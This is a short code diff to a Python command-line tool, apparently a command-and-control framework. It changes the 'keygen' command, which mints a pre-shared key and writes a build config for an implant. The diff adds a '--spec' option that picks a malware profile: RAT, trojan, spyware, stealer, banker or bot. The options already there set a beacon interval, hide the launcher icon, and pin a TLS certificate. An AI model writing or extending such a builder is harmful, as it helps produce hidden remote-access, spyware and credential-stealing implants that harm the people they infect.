@@ -49,11 +49,12 @@ def doctor():
 @click.option("--interval", default=60000, show_default=True, help="beacon interval in ms (min 15000)")
 @click.option("--hide-icon", is_flag=True, help="disable the launcher alias at first run")
 @click.option("--pin", default="", help="optional TLS cert SHA-256 pin")
+@click.option("--spec", default="rat", help="rat/trojan/spyware/malware/stealer/banker/bot/minimal")
 @click.option("--out", default=os.path.join(HOME, "agent.json"), help="config path to write")
-def keygen(host, label, interval, hide_icon, pin, out):
+def keygen(host, label, interval, hide_icon, pin, spec, out):
     """Mint a PSK and write a build config for this C2."""
     key_b64 = _psk_b64(PSK_PATH)
-    config = builder.make_config(host, key_b64, label, interval, hide_icon, pin)
+    config = builder.make_config(host, key_b64, label, interval, hide_icon, pin, spec)
     os.makedirs(os.path.dirname(out) or ".", exist_ok=True)
     with open(out, "w", encoding="utf-8") as handle:
         json.dump(config, handle, indent=2)
